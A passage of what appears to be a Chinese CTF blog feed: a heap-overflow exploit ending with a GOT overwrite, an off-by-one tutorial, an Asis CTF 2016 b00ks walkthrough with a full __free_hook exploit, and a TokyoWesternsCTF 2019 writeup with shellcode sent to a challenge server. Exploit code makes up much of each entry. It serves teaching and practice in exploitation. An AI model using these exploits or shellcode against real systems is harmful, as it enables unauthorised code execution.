class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sh.recvuntil(<span class="hljs-string">'Your choice :'</span>)    sh.sendline(<span class="hljs-string">'3'</span>)    sh.recvuntil(<span class="hljs-string">'Index :'</span>)    sh.sendline(str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>    sh.recvuntil(<span class="hljs-string">'Your choice :'</span>)    sh.sendline(<span class="hljs-string">'4'</span>)    sh.recvuntil(<span class="hljs-string">'Index :'</span>)    sh.sendline(str(idx))free_got=elf.got[<span class="hljs-string">'free'</span>]create(<span class="hljs-number">0x18</span>,<span class="hljs-string">'aaaaaaa'</span>)  <span class="hljs-comment">#idx0 实际分配了0x10的chunk，重用idx1的prev_size的8个字节</span>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">'aaaaaaa'</span>)　<span class="hljs-comment">#idx1　　</span>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">'aaaaaaa'</span>)　　<span class="hljs-comment">#idx2</span>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">'/bin/sh\x00'</span>)　　<span class="hljs-comment">#idx3</span>payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">'\x81'</span>edit(<span class="hljs-number">0</span>,payload)   <span class="hljs-comment">#修改idx1的size为0x81</span>delete(<span class="hljs-number">1</span>)　　<span class="hljs-comment">#idx1进入0x70的unsorted bin</span>size=<span class="hljs-string">'\x08'</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)payload=<span class="hljs-string">'b'</span>*<span class="hljs-number">0x40</span>+size+p64(free_got)create(<span class="hljs-number">0x70</span>,payload)　　<span class="hljs-comment">#分配到idx1 此时size为0x70，可以堆溢出到idx2，修改idx2的内容指针为free_got</span>show(<span class="hljs-number">2</span>)　　<span class="hljs-comment">#输出free真实地址,泄露libc基地址</span>sh.recvuntil(<span class="hljs-string">'Content :'</span>)free_adr=u64(sh.recvline().strip().ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))<span class="hljs-keyword">print</span> <span class="hljs-string">'free_adr: '</span>+hex(free_adr)libc_base=free_adr-libc.symbols[<span class="hljs-string">'free'</span>]system_adr=libc_base+libc.symbols[<span class="hljs-string">'system'</span>]<span class="hljs-keyword">print</span> <span class="hljs-string">'libc_base: '</span>+hex(libc_base)<span class="hljs-keyword">print</span> <span class="hljs-string">'system_adr: '</span>+hex(system_adr)edit(<span class="hljs-number">2</span>,p64(system_adr)) <span class="hljs-comment">#将free_got改为system地址</span>delete(<span class="hljs-number">3</span>)　　　　　　　　<span class="hljs-comment">#free(idx-&gt;content)触发</span>sh.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Geek 10th write up</title>
      <link href="/2019/10/17/Geek-10th-write-up/"/>
      <url>/2019/10/17/Geek-10th-write-up/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Off-By-One学习</title>
      <link href="/2019/10/10/Off-By-One%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/10/10/Off-By-One%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。</p><h2 id="原理">原理<a class="post-anchor" href="#原理"></a></h2><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li><li>字符串操作不合适</li></ul><p>一般来说，单字节溢出被认为是难以利用，但是因为 linux 的堆管理机制 ptmalloc 验证的松散性，基于 linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss段等等。但是堆上（heap based）的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p><h2 id="off-by-one-利用思路">off-by-one 利用思路<a class="post-anchor" href="#off-by-one-利用思路"></a></h2><ol><li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li><li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得<code>prev_in_use</code>位被清，这样前块会被认为是 free 块。(1) 这时可以选择使用 unlink 方法进行处理。(2) 另外，这时<code>prev_size</code>域就会启用，就可以伪造<code>prev_size</code>，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照<code>prev_size</code>找到块的后一块（理论上是当前正在unlink的块）与当前正在 unlink 的块大小是否相等。</li></ol><p>最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 前并没有该 check。</p><pre><code class="hljs cpp"><span class="hljs-comment">/* consolidate backward */</span>    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;      prevsize = prev_size (p);      size += prevsize;      p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));      <span class="hljs-comment">/* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */</span>      <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))        malloc_printerr (<span class="hljs-string">"corrupted size vs. prev_size while consolidating"</span>);      unlink_chunk (av, p);    &#125;</code></pre><h3 id="示例1">示例1<a class="post-anchor" href="#示例1"></a></h3><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">my_gets</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *ptr,<span class="hljs-keyword">int</span> size)</span></span>&#123;    <span class="hljs-keyword">int</span> i;    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=size;i++)    &#123;        ptr[i]=getchar();    &#125;    <span class="hljs-keyword">return</span> i;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">void</span> *chunk1,*chunk2;    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Get Input:"</span>);    my_gets(chunk1,<span class="hljs-number">16</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>我们自己编写的 my_gets 函数导致了一个 off-by-one 漏洞，原因是 for 循环的边界没有控制好导致写入多执行了依次，这也被称为栅栏错误</p><p>我们使用gdb 对程序进行调试，在进行输入前可以看到分配的两个用户区域为16 字节的堆块</p><pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk10x602010:   0x0000000000000000  0x00000000000000000x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk20x602030:   0x0000000000000000  0x0000000000000000</code></pre><p>当我们执行 my_gets 进行输入之后，可以看到数据发生了溢出覆盖到了下一个堆块的 prev_size 域 print ‘A’*17</p><pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk10x602010:   0x4141414141414141  0x41414141414141410x602020:   0x0000000000000041  0x0000000000000021 &lt;=== chunk20x602030:   0x0000000000000000  0x0000000000000000</code></pre><h3 id="实例2">实例2<a class="post-anchor" href="#实例2"></a></h3><p>第二种常见的导致 off-by-one 的场景就是字符串操作了，常见的原因是字符串的结束符计算有误</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;    <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">40</span>]=<span class="hljs-string">""</span>;    <span class="hljs-keyword">void</span> *chunk1;    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Get Input"</span>);    gets(buffer);    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(buffer)==<span class="hljs-number">24</span>)    &#123;        <span class="hljs-built_in">strcpy</span>(chunk1,buffer);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>程序乍看上去没有任何问题（不考虑栈溢出），可能很多人在实际的代码中也是这样写的。<br>但是 strlen 和 strcpy 的行为不一致却导致了 off-by-one 的发生。<br>strlen 是我们很熟悉的计算 ascii 字符串长度的函数，这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code> 。这就导致了我们向 chunk1 中写入了 25 个字节，我们使用 gdb 进行调试可以看到这一点。</p><pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x00000000000000210x602010:   0x4141414141414141  0x41414141414141410x602020:   0x4141414141414141  0x0000000000000400</code></pre><p>可以看到 next chunk 的 size 域低字节被结束符 <code>&#39;\x00&#39;</code> 覆盖，这种又属于 off-by-one 的一个分支称为 NULL byte off-by-one，我们在后面会看到 off-by-one 与 NULL byte off-by-one 在利用上的区别。<br>还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的 CPU 的字节序都是小端法的，比如一个 DWORD 值在使用小端法的内存中是这样储存的</p><pre><code class="hljs assembly">DWORD 0x41424344内存  0x44,0x43,0x42,0x41</code></pre><h3 id="实例1–-Asis-CTF-2016-b00ks">实例1– Asis CTF 2016 b00ks<a class="post-anchor" href="#实例1–-Asis-CTF-2016-b00ks"></a></h3><p><strong>题目介绍</strong></p><p>题目是一个常见的菜单式程序，功能是一个图书管理系统。</p><pre><code class="hljs python"><span class="hljs-number">1.</span> Create a book<span class="hljs-number">2.</span> Delete a book<span class="hljs-number">3.</span> Edit a book<span class="hljs-number">4.</span> Print book detail<span class="hljs-number">5.</span> Change current author name<span class="hljs-number">6.</span> Exit</code></pre><p>题目提供了创建、删除、编辑、打印图书的功能。题目是64位程序，保护如下所示</p><pre><code class="hljs bash">Canary                        : NoNX                            : YesPIE                           : YesFortify                       : NoRelRO                         : Full</code></pre><p>程序每创建一个 book 会分配 0x20 字节的结构来维护它的信息</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">book</span>&#123;</span>    <span class="hljs-keyword">int</span> id;    <span class="hljs-keyword">char</span> *name;    <span class="hljs-keyword">char</span> *description;    <span class="hljs-keyword">int</span> size;&#125;</code></pre><p><strong>create</strong></p><p>book 结构中存在 name 和 description，name 和 description 在堆上分配。首先分配 name buffer，使用malloc。大小自定但小于 32.</p><pre><code class="hljs cpp"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"\nEnter book name size: "</span>, *(_QWORD *)&amp;size);__isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;size);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Enter book name (Max 32 chars): "</span>, &amp;size);ptr = <span class="hljs-built_in">malloc</span>(size);</code></pre><p>之后分配 description ，同样大小自定但无限制。</p><pre><code class="hljs cpp"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"\nEnter book description size: "</span>, *(_QWORD *)&amp;size);__isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;size);v5 = <span class="hljs-built_in">malloc</span>(size);</code></pre><p>之后分配 book 结构的内存</p><pre><code class="hljs cpp">book = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>uLL);<span class="hljs-keyword">if</span> ( book )&#123;    *((_DWORD *)book + <span class="hljs-number">6</span>) = size;    *((_QWORD *)off_202010 + v2) = book;    *((_QWORD *)book + <span class="hljs-number">2</span>) = description;    *((_QWORD *)book + <span class="hljs-number">1</span>) = name;    *(_DWORD *)book = ++unk_202024;    <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;&#125;</code></pre><p><strong>漏洞</strong></p><p>程序编写的 read 函数存在 null byte off-by-one 漏洞，仔细观察这个 read 函数可以发现对于边界的考虑是不当的。</p><pre><code class="hljs cpp"><span class="hljs-keyword">signed</span> __int64 __<span class="hljs-function">fastcall <span class="hljs-title">my_read</span><span class="hljs-params">(_BYTE *ptr, <span class="hljs-keyword">int</span> number)</span></span>&#123;  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span>  _BYTE *buf; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>  <span class="hljs-keyword">if</span> ( number &lt;= <span class="hljs-number">0</span> )    <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;  buf = ptr;  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )  &#123;    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">1u</span>LL) != <span class="hljs-number">1</span> )      <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;    <span class="hljs-keyword">if</span> ( *buf == <span class="hljs-string">'\n'</span> )      <span class="hljs-keyword">break</span>;    ++buf;    <span class="hljs-keyword">if</span> ( i == number )      <span class="hljs-keyword">break</span>;  &#125;  *buf = <span class="hljs-number">0</span>; --》 漏洞位置  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;&#125;</code></pre><h4 id="利用">利用<a class="post-anchor" href="#利用"></a></h4><p>创建两个<code>b00k</code>, 在<code>first b00k</code>中伪造<code>b00k</code>进而控制<code>second b00k</code>的<code>description</code>指针, 将该指针改为<code>__free_hook</code>, 修改<code>second b00k</code>的<code>description</code>为<code>execve(&quot;/bin/sh&quot;)</code>, 最后<code>free</code></p><p><strong>泄露</strong></p><p>因为程序中的 my_read 函数存在 null byte off-by-one ，事实上 my_read 读入的结束符 ‘\x00’ 是写入到 0x555555756060 的位置的。这样当 0x555555756060～0x555555756068 写入 book 指针时就会覆盖掉结束符 ‘\x00’ ，所以这里是存在一个地址泄漏的漏洞。通过打印 author name 就可以获得 pointer array 中第一项的值。</p><p>books 位置</p><pre><code class="hljs assembly">        0x55865b7c9040:    0x4141414141414141    0x4141414141414141        0x55865b7c9050:    0x4141414141414141    0x4141414141414141 --&gt; authorb00ks&lt;--0x55865b7c9060:    0x000055865cc0d160(first book)    0x0000000000000000</code></pre><p>null byte overflow</p><pre><code class="hljs assembly">0x55865b7c9040:    0x4141414141414141    0x41414141414141410x55865b7c9050:    0x4141414141414141    0x41414141414141410x55865b7c9060:    0x000055865cc0d100(0x60--&gt;0x00)    0x000055865cc0d190</code></pre><p><strong>1. 创建第一个firest book</strong></p><pre><code class="hljs assembly">0x55f276c74160:    0x0000000000000001                 0x000055f276c74020--&gt; Name0x55f276c74170:    0x000055f276c740c0(description)    0x000000000000008c(140)</code></pre><p>当<code>0x55f276c74160 --&gt; 0x55f276c74100</code>时, <code>0x55f276c74100</code>正好落在<code>first b00k</code>的<code>description</code>中, 属于可控范围, 为我们伪造<code>b00k</code>打下了基础.</p><p><strong>2. leak book1 addr</strong></p><p>my_read 读入的结束符 ‘\x00’ 会被写如 book1 时覆盖</p><p>所以 print author name 时 会泄露 book1 在 buf 的地址</p><p><strong>3. 申请 book2</strong></p><p>book2的description的大小越大越好(如0x21000)，这样会通过mmap()函数去分配堆空间，而该堆地址与libc的基址相关，这样通过泄露该堆地址可以计算出libc的基址。</p><p><strong>4. 伪造book</strong></p><pre><code class="hljs assembly">0x55f276c740c0:    0x4141414141414141    0x41414141414141410x55f276c740d0:    0x4141414141414141    0x41414141414141410x55f276c740e0:    0x4141414141414141    0x41414141414141410x55f276c740f0:    0x4141414141414141    0x41414141414141410x55f276c74100:    0x0000000000000001    0x000055f276c74198----0x55f276c74110:    0x000055f276c74198    0x000000000000ffff   |......                                                   |0x55f276c74160:    0x0000000000000001    0x000055f276c74020   |0x55f276c74170:    0x000055f276c740c0    0x000000000000008c   |0x55f276c74180:    0x0000000000000000    0x0000000000000031   |0x55f276c74190:    0x0000000000000002    0x00007f282b8e7010 &lt;-|0x55f276c741a0:    0x00007f282b8c5010    0x00000000000210000x55f276c741b0:    0x0000000000000000    0x0000000000020e51</code></pre><p>可以看到<code>0x55f276c74100</code>已经是<code>fake b00k1</code></p><p><strong>5. 空字节覆盖 leak book2 name pointer&amp;libcbase</strong></p><pre><code class="hljs assembly">0x55f275d55040:    0x4141414141414141    0x41414141414141410x55f275d55050:    0x4141414141414141    0x41414141414141410x55f275d55060:    0x000055f276c74100    0x000055f276c74190</code></pre><p>泄露的是<code>second b00k</code>的<code>name pointer</code>和<code>description pointer</code>.<br>这个指针和libc base address是有直接联系的.</p><pre><code class="hljs assembly">0x000055f276c73000 0x000055f276c95000 rw-p    [heap]0x00007f282b33e000 0x00007f282b4fe000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007f282b4fe000 0x00007f282b6fe000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so</code></pre><p>  <code>offset = 0x7f282b8e7010 - 0x00007f282b33e000 = 0x5a9010</code><br>  <strong>结论:</strong> 通过伪造的<code>b00k</code>, 我们泄露了 <code>libc base address</code>.</p><p>**6. 获取相关指针</p><p>主要是两个</p><pre><code class="hljs assembly">malloc_hook = libc.symbols[&apos;__free_hook&apos;] + libcbaseexecve_addr = libcbase + 0x4526a</code></pre><p> <strong>结论:</strong>  通过<code>libc base address</code>, 退出了<code>__free_hook</code>和<code>execve_addr</code>在程序中的实际位置.</p><p><strong>7. 修改 get shell</strong></p><p>通过先后修改<code>book1_description</code>和<code>book2_description</code>，可以实现任意地址写任意内容的功能。由于该程序启用了<code>FULL RELRO</code>保护措施，无法对<code>GOT</code>进行改写，但是可以改写<code>__free_hook</code>或<code>__malloc_hook</code>。</p><p>通过<code>first b00k</code>修改<code>second b00k</code>的<code>description</code>指针为<code>__free_hook</code>, 在修改second b00k的description内容为<code>execve(&quot;/bin/sh&quot;, null, environ)</code>, 最后执行<code>free</code></p><pre><code class="hljs assembly">0x55f276c74190:    0x0000000000000002    0x00007f282b7047a8 --0x55f276c741a0:    0x00007f282b7047a8    0x0000000000021000  |......                                                  |0x7f282b7047a8 &lt;__free_hook&gt;:  0x00007f306ff4726a    0x0000000000000000</code></pre><p><strong>结论:</strong> 由于<code>__free_hook</code>里面的内容不为<code>NULL</code>, 遂执行内容指向的指令, 即<code>execve(&quot;/bin/sh&quot;, null, environ)</code></p><h4 id="相关问题解答">相关问题解答<a class="post-anchor" href="#相关问题解答"></a></h4><p><strong>为什么第二个 b00k申请的空间那么大?</strong></p><blockquote><p>​    If we allocate a chunk bigger than the wilderness chunk, it  mmap’s a new area for use. And this area is adjacent to the libc’s bss  segment<br>简单的说, 申请小了不能够泄露出<code>libc base address</code></p></blockquote><p><strong>exp</strong></p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#context.log_level = 'debug'</span>elf = ELF(<span class="hljs-string">"./b00ks"</span>)libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)p = process(<span class="hljs-string">"./b00ks"</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_name</span><span class="hljs-params">(name)</span>:</span>p.sendlineafter(<span class="hljs-string">"Enter author name: "</span>, name)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_book</span><span class="hljs-params">(size,name,des_size,des)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,<span class="hljs-string">"1"</span>)p.sendlineafter(<span class="hljs-string">"\nEnter book name size: "</span>,str(size))p.sendlineafter(<span class="hljs-string">"Enter book name (Max 32 chars): "</span>,name)p.sendlineafter(<span class="hljs-string">"\nEnter book description size: "</span>, str(des_size))p.sendlineafter(<span class="hljs-string">"Enter book description: "</span>, des)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete_book</span><span class="hljs-params">(id)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>, <span class="hljs-string">"2"</span>)p.sendlineafter(<span class="hljs-string">"Enter the book id you want to delete: "</span>, str(id))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit_book</span><span class="hljs-params">(id,new_des)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,<span class="hljs-string">"3"</span>)p.sendlineafter(<span class="hljs-string">"Enter the book id you want to edit: "</span>, str(id))p.sendlineafter(<span class="hljs-string">"Enter new book description: "</span>, new_des)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">memleak2</span><span class="hljs-params">()</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,<span class="hljs-string">"4"</span>)p.recvuntil(<span class="hljs-string">"Name: "</span>)msg=p.recvline().strip(<span class="hljs-string">"\n"</span>)    msg=u64(msg.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))    log.success(<span class="hljs-string">"Leaked address of second book name pointer : "</span> + hex(msg))    <span class="hljs-keyword">return</span> msg<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change_name</span><span class="hljs-params">(name)</span>:</span>p.sendlineafter(<span class="hljs-string">"&gt; "</span>,<span class="hljs-string">"5"</span>)p.sendlineafter(<span class="hljs-string">"Enter author name: "</span>, name)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">memleak1</span><span class="hljs-params">()</span>:</span>p.recvuntil(<span class="hljs-string">"&gt; "</span>)p.sendline(<span class="hljs-string">"4"</span>)p.recvuntil(<span class="hljs-string">"Author:"</span>)msg = p.recvuntil(<span class="hljs-string">"\n"</span>,drop=<span class="hljs-literal">True</span>)[<span class="hljs-number">33</span>:]log.success(<span class="hljs-string">"msg : "</span>+msg)addr = u64(msg.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))log.success(<span class="hljs-string">"Leaked address of first book : "</span> + hex(addr))<span class="hljs-keyword">return</span> addrcreate_name(<span class="hljs-string">"a"</span>*<span class="hljs-number">32</span>)create_book(<span class="hljs-number">140</span>,<span class="hljs-string">"a"</span>,<span class="hljs-number">140</span>,<span class="hljs-string">"a"</span>)<span class="hljs-comment">#leak book addr</span>first_addr = memleak1()second_addr = first_addr + <span class="hljs-number">0x38</span>log.success(<span class="hljs-string">"second addr : "</span> + hex(second_addr))<span class="hljs-comment">#create second book</span>create_book(<span class="hljs-number">0x21000</span>,<span class="hljs-string">"a"</span>,<span class="hljs-number">0x21000</span>,<span class="hljs-string">"a"</span>)<span class="hljs-comment">#fake first book</span>payload = <span class="hljs-string">"a"</span>*<span class="hljs-number">0x40</span> + p64(<span class="hljs-number">1</span>) + p64(second_addr)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0xffff</span>)edit_book(<span class="hljs-number">1</span>,payload)<span class="hljs-comment">#null byte off-by-one</span>change_name(<span class="hljs-string">"a"</span>*<span class="hljs-number">32</span>)<span class="hljs-comment">#leak second book pointer</span>sec_name_addr = memleak2()libcbase = sec_name_addr - <span class="hljs-number">0x5b0010</span>log.info(<span class="hljs-string">"libcbase: %s"</span> % hex(libcbase))free_hook = libc.symbols[<span class="hljs-string">'__free_hook'</span>] + libcbaselog.success(<span class="hljs-string">"free_hook : "</span> + hex(free_hook))execve_addr = libcbase + <span class="hljs-number">0x45216</span>log.success(<span class="hljs-string">"execve : "</span> + hex(execve_addr))<span class="hljs-comment">#gdb.attach(p)</span><span class="hljs-comment"># getshell</span>system = libc.symbols[<span class="hljs-string">'system'</span>] + libcbasebinsh_addr = libc.search(<span class="hljs-string">'/bin/sh'</span>).next() + libcbasepayload = p64(binsh_addr) + p64(free_hook)edit_book(<span class="hljs-number">1</span>, payload)payload = p64(system)edit_book(<span class="hljs-number">2</span>, payload)<span class="hljs-string">'''edit_book(1,p64(free_hook)*2)edit_book(2,p64(execve_addr))'''</span>delete_book(<span class="hljs-number">2</span>)p.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TokyoWesternsCTF 2019 writeup</title>
      <link href="/2019/09/02/TokyoWesternsCTF-2019-writeup/"/>
      <url>/2019/09/02/TokyoWesternsCTF-2019-writeup/</url>
      
        <content type="html"><![CDATA[<p>tcl 做了三道签到题目</p><h2 id="warmup">warmup<a class="post-anchor" href="#warmup"></a></h2><p>没有任何保护的栈溢出</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *elf=ELF(<span class="hljs-string">'./pwn'</span>)shellcode = <span class="hljs-string">"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"</span>addr=<span class="hljs-number">0x0000000000601A00</span>buf=<span class="hljs-number">0x00007FFE0740F240</span>ret=<span class="hljs-number">0x00007FFE0740F348</span><span class="hljs-comment">#io=process('./pwn')</span><span class="hljs-comment">#pause()</span>io=remote(<span class="hljs-string">'nothing.chal.ctf.westerns.tokyo'</span>,<span class="hljs-number">10001</span>)io.sendline((ret-buf)*<span class="hljs-string">'a'</span>+p64(<span class="hljs-number">0x0000000000400773</span>)+p64(addr)+p64(elf.plt[<span class="hljs-string">'gets'</span>])+p64(addr))io.sendline(shellcode)io.interactive()</code></pre><h2 id="easy-crackme">easy_crackme<a class="post-anchor" href="#easy-crackme"></a></h2><p>这道题目耗时间比较长<br>最后用z3 一个一个进行约束即可</p><h3 id="check1">check1<a class="post-anchor" href="#check1"></a></h3><pre><code class="hljs cpp">v46 = '76543210';v47 = 'fedcba98';for ( i = 0; i &lt;= 15; ++i )&#123;  for ( j = strchr(s, *((char *)&amp;v46 + i)); j; j = strchr(j + 1, *((char *)&amp;v46 + i)) )    ++*((_DWORD *)&amp;s1 + i);&#125;if ( memcmp(&amp;s1, &amp;unk_400F00, 0x40uLL) )&#123;  puts("incorrect");  exit(0);&#125;</code></pre><p>判断字符出现次数</p><h3 id="check2">check2<a class="post-anchor" href="#check2"></a></h3><pre><code class="hljs cpp">v21 = <span class="hljs-number">0L</span>L;    v22 = <span class="hljs-number">0L</span>L;    v23 = <span class="hljs-number">0L</span>L;    v24 = <span class="hljs-number">0L</span>L;    v25 = <span class="hljs-number">0L</span>L;    v26 = <span class="hljs-number">0L</span>L;    v27 = <span class="hljs-number">0L</span>L;    v28 = <span class="hljs-number">0L</span>L;    <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">7</span>; ++k )    &#123;      v10 = <span class="hljs-number">0</span>;      v11 = <span class="hljs-number">0</span>;      <span class="hljs-keyword">for</span> ( l = <span class="hljs-number">0</span>; l &lt;= <span class="hljs-number">3</span>; ++l )                <span class="hljs-comment">// 遍历 &#123;***&#125; 的内容</span>      &#123;        v5 = s[<span class="hljs-number">4</span> * k + <span class="hljs-number">6</span> + l];        v10 += v5;        v11 ^= v5;      &#125;      *((_DWORD *)&amp;v21 + k) = v10;              <span class="hljs-comment">// 四个一组的和</span>      *((_DWORD *)&amp;v25 + k) = v11;              <span class="hljs-comment">// 四个一组异或的值</span>    &#125;</code></pre><h3 id="check3">check3<a class="post-anchor" href="#check3"></a></h3><pre><code class="hljs cpp">v29 = <span class="hljs-number">0L</span>L;v30 = <span class="hljs-number">0L</span>L;v31 = <span class="hljs-number">0L</span>L;v32 = <span class="hljs-number">0L</span>L;v33 = <span class="hljs-number">0L</span>L;v34 = <span class="hljs-number">0L</span>L;v35 = <span class="hljs-number">0L</span>L;v36 = <span class="hljs-number">0L</span>L;<span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">7</span>; ++m )&#123;  v14 = <span class="hljs-number">0</span>;  v15 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">for</span> ( n = <span class="hljs-number">0</span>; n &lt;= <span class="hljs-number">3</span>; ++n )  &#123;    v6 = s[<span class="hljs-number">8</span> * n + <span class="hljs-number">6</span> + m];    v14 += v6;    v15 ^= v6;  &#125;  *((_DWORD *)&amp;v29 + m) = v14;  *((_DWORD *)&amp;v33 + m) = v15;&#125;<span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>(&amp;v21, &amp;unk_400F40, <span class="hljs-number">0x20</span>uLL) || <span class="hljs-built_in">memcmp</span>(&amp;v25, &amp;unk_400F60, <span class="hljs-number">0x20</span>uLL) )&#123;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>(&amp;v29, &amp;unk_400FA0, <span class="hljs-number">0x20</span>uLL) || <span class="hljs-built_in">memcmp</span>(&amp;v33, &amp;unk_400F80, <span class="hljs-number">0x20</span>uLL) )&#123;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"incorrect"</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre><h3 id="check4">check4<a 